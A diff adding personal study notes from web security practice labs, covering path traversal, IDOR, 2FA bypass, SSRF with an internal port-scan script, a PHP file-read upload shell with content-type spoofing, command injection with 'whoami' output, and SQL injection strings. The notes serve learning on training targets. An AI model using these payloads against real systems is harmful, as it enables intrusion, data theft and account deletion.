@@ -1,0 +1,60 @@
+Path traversal: when accessing images or files via ?filename in html, you can send ?filename=../../../ and get access to unathorized files.
+  Lab1: send image?filename=../../../etc/passwd (this wasnt working so i sent a curl to that url to get raw data back)
+    
+Access control: gaining access to data that a user shouldnt.
+  vertical priviledge escalation: a user gains admin control. eg gain access via exposed /admin paths
+  Lab2: visit url/robots.txt -> find disallow admin panel -> visit url/administrator-panel
+  Lab3: f12 -> search script(f12 ctrl+f isAdmin) -> find the href -> visit to gain vertical priviledge
+  Lab4: login with credentials -> theres a cookie param check in network tab that checks isAdmin:true/false -> using devtools,storage: change cookie param to true -> visit /admin
+
+  horizontal priviledge escalation: a user gains access to another users data. eg editing ?id= to gain access. this is called idor(insecure direct object reference)
+  Lab5: find a post by carlos -> visit his profile -> in the url theres ?userId=.... -> visit my-account?id=[carlos id] -> api found
+  Lab6: visit url/my-account?id=administrator -> use inspector to get hidden field value -> log in with administrator and passwd -> delete user in admin-panel
+
+Authentication vulnerabilites:
+  Authentication: checking if the user is who they claim to able
+  authorization: checking if a user is allowed to do something
+  brute forcing: automating the process of sending login credentials. most times usernames are either publicly shown or predictable(eg first.lastname@company.com).
+                 passwords could be somewhat less random, due to human nature. eg instead of random characters it could be Mypasswd1! and subsequent changes, only tweak 1-2 characters
+  username enumaration: in register pages check for already taken usernames, or in login check for correct username but wrong password
+  Lab7: skipped for now
+
+  skipping 2fa: sometimes, when 2fa is prompted, the user is already in a loggedin state and can manually change the url to access content
+  Lab8: login to my account and enter the 2fa -> recon the changed url -> url/my-account?id=wiener -> enter credentials for target -> when prompted for 2fa, change url and access
+
+SSRF: server side request forgery, causing the server-side application make request to internal services. Example being using REST Api and gain access.
+  Lab9: curl --request POST --data-urlencode 'stockApi=http://localhost/admin' "https://0aca00c70344eca281302fbb00450072.web-security-academy.net/product/stock"
+        curl --request POST --data-urlencode 'stockApi=http://localhost/admin/delete?username=carlos' "https://0aca00c70344eca281302fbb00450072.web-security-academy.net/product/stock"
+
+  Lab10: create a script that scans each port:
+        #!/bin/bash
+
+        for i in {1..255}; do
+            echo "=== 192.168.0.$i ==="
+            curl -s --request POST --data-urlencode "stockApi=http://192.168.0.$i:8080/admin" \
+            "https://0af8000b03a5237680d9ee39002f00be.web-security-academy.net/product/stock"
+            echo
+          done
+          ./script > results.txt
+          cat results.txt | grep "admin"
+          curl -s --request POST --data-urlencode "stockApi=http://192.168.0.6:8080/admin/delete?username=carlos" "https://0af8000b03a5237680d9ee39002f00be.web-security-academy.net/product/stock"
+
+File upload vulnerabilites: The ability to upload files without guardrails.
+  Lab11: write a one liner script:
+      <?php echo file_get_contents('/home/carlos/secret'); ?>
+      upload as avatar -> network tab shows a GET at ulr/files/avatars
+      visit url/files/avatars/exploit.php
+      
+  Lab12: still with the same exploit.php script:
+      curl -X POST "https://0a30009203afefae81c13e7e00a2002c.web-security-academy.net/my-account/avatar" -H "Cookie: session=9oyCNckvV9kGyK9mjmSKL6r2y10fflqB" -F "avatar=@exploit.php;type=image/jpeg" -F "user=wiener" -F "csrf=FYFeWIDfVBwI41JQ3affFWgtOriGCrpP"
+      visited network tab and found the request, modified to make content-type of exploit.php image/jpeg
+      succesfully upload and visited url/files/avatars/exploit.php
+  Lab13:
+    checked post request for checking stock and saw this fields in the request
+    curl --request POST --data-urlencode 'productId=& echo hello' --data-urlencode 'storeId=& whoami' "https://0a33003e047606c28015e42500a600f1.web-security-academy.net/product/stock"
+    hello
+    peter-WP0JXh
+
+SQL Injection: 
+  Lab14: visited a category. appended '-- at the end
+  Lab15: in login: username=administrator'--
